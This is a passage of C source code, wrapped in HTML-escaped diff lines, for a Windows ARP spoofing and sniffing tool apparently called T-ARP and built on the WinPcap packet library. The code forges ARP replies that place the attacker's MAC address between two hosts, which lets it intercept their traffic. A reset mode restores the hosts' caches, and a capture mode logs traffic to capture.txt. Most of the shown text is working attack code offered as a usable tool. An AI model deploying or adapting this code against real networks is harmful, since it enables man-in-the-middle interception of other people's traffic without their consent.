+      ",inet_ntoa(fsin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;5;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x-",mmac[k]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x\n",mmac[5]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\ni 
+      will try to snoof 
+      ...\n\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stimes=TRUE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nNot 
+      get enough data\n"); 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(fun==4)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(mm) 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if((firstip==myip) 
+      &amp;&amp; 
+      (secondip==myip))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fm=TRUE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sm=TRUE;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(fmac,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(smac,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(!fm || 
+      !sm)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nNot 
+      get enough 
+      data\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nReset 
+      %.16s 
+      :&nbsp;&nbsp;",inet_ntoa(fsin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.16s 
+      ==&gt; 
+      ",inet_ntoa(ssin.sin_addr));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;5;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x-",smac[k]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x\n",smac[5]);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Reset 
+      %.16s 
+      :&nbsp;&nbsp;",inet_ntoa(ssin.sin_addr));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.16s 
+      ==&gt; 
+      ",inet_ntoa(fsin.sin_addr));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(k=0;k&lt;5;k++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x-",fmac[k]);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;printf("%.2x\n\n",fmac[5]);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stimes=FALSE;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nNot 
+      get enough data\n"); 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;do<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_dst,fmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_tha,fmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tpa=htonl(firstip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_spa=htonl(secondip);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!stimes)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_src,smac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_sha,smac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_src,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_sha,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(sendbuf,0,sizeof(sendbuf));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf,&amp;eth;,sizeof(eth));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf+sizeof(eth),&amp;arp,sizeof(arp));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSetNumWrites(lpadapter,2)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Warning: 
+      Unable to send a packet 2 
+      times\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketSendPacket 
+      in SendSR Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(1000);&nbsp;&nbsp;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_dst,smac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_tha,smac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_tpa=htonl(secondip);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp.arp_spa=htonl(firstip);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!stimes)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_src,fmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_sha,fmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(eth.eh_src,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(arp.arp_sha,mmac,6);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memset(sendbuf,0,sizeof(sendbuf));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf,&amp;eth;,sizeof(eth));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(sendbuf+sizeof(eth),&amp;arp,sizeof(arp));<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PacketInitPacket(lppackets,sendbuf,sizeof(eth)+sizeof(arp));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(PacketSendPacket(lpadapter,lppackets,TRUE)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketSendPacket 
+      int sendSR Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(1000);<BR>&nbsp;&nbsp;&nbsp;&nbsp;}while(stimes);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(fun==4)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Reset 
+      Successfully");<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;return 0;<BR>}<BR><BR>int 
+      main(int argc,char 
+      *argv[])<BR>{<BR>&nbsp;&nbsp;&nbsp;&nbsp;HANDLE&nbsp;&nbsp; 
+      sthread,rthread;<BR>&nbsp;&nbsp;&nbsp;&nbsp;WCHAR&nbsp;&nbsp;&nbsp;&nbsp;adaptername[8192];<BR>&nbsp;&nbsp;&nbsp;&nbsp;WCHAR&nbsp;&nbsp;&nbsp;&nbsp;*name1,*name2;<BR>&nbsp;&nbsp;&nbsp;&nbsp;ULONG&nbsp;&nbsp;&nbsp;&nbsp;adapterlength;<BR>&nbsp;&nbsp;&nbsp;&nbsp;DWORD&nbsp;&nbsp;&nbsp;&nbsp;threadsid,threadrid;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;&nbsp; 
+      NetType&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ntype;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;&nbsp; 
+      bpf_stat&nbsp;&nbsp;&nbsp;&nbsp; 
+      stat;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;&nbsp; 
+      sockaddr_in&nbsp;&nbsp;sin;<BR>&nbsp;&nbsp;&nbsp;&nbsp;struct&nbsp;&nbsp; 
+      npf_if_addr&nbsp;&nbsp;ipbuff;<BR>&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;adapternum=0,opti=0,open,i,total;<BR>&nbsp;&nbsp;&nbsp;&nbsp;long&nbsp;&nbsp;&nbsp;&nbsp; 
+      npflen;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;system("cls.exe");<BR>&nbsp;&nbsp;&nbsp;&nbsp;start();<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(argc!=4)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;usage();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getche();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!strcmp(argv[1],"-m"))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;opti=1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(!strcmp(argv[1],"-a"))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;opti=2;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(!strcmp(argv[1],"-s"))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;opti=3;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      &nbsp;&nbsp;&nbsp;&nbsp;if((fp=fopen("capture.txt","w+"))==NULL)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("Open 
+      capture.txt Error: 
+      %d\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fwrite("T-ARP 
+      Captrue 
+      Data",20,1,fp);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else 
+      if(!strcmp(argv[1],"-r"))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;opti=4;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;usage();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;getche();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;firstip=ntohl(inet_addr(argv[2]));<BR>&nbsp;&nbsp;&nbsp;&nbsp;secondip=ntohl(inet_addr(argv[3]));<BR>&nbsp;&nbsp;&nbsp;&nbsp;total=secondip-firstip+1;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("\nLibarary 
+      Version: 
+      %s",PacketGetVersion());<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;adapterlength=sizeof(adaptername);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(PacketGetAdapterNames((char 
+      *)adaptername,&amp;adapterlength)==FALSE)<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("PacketGetAdapterNames 
+      Error: 
+      %d\n",GetLastError());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return 
+      -1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;<BR>&nbsp;&nbsp;&nbsp;&nbsp;name1=adaptername;<BR>&nbsp;&nbsp;&nbsp;&nbsp;name2=adaptername;<BR>&nbsp;&nbsp;&nbsp;&nbsp;i=0;<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;while((*name1!='\0') 
+      || 
+      (*(name1-1)!='\0'))<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(*name1=='\0')<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;memcpy(adapterlist[i],name2,2*(name1-name2));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name2=name1+1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;name1++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;}<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;adapternum=i;<BR>&nbsp;&nbsp;&nbsp;&nbsp;printf("\nAdapters 
+      Installed:\n");<BR>&nbsp;&nbsp;&nbsp;&nbsp;for(i=0;i&lt;adapternum;i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wprintf(L"%d 
+      - 
+      %s\n",i+1,adapterlist[i]);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;do<BR>&nbsp;&nbsp;&nbsp;&nbsp;{<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("\nSelect 
+      the number of the adapter to open: 
+      ");<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;scanf("%d",&amp;open);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(open&gt;=1 
+      &amp;&amp; 
+      open&lt;=adapternum)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+      <BR>&nbsp;&nbsp;&nbsp;&nbsp;}while(open&lt;1 || 
+      open&gt;adapternum);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;lpadapter=PacketOpenAdapter(adapterlist[open-1]);<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;if(!lpadapter 
+      || 
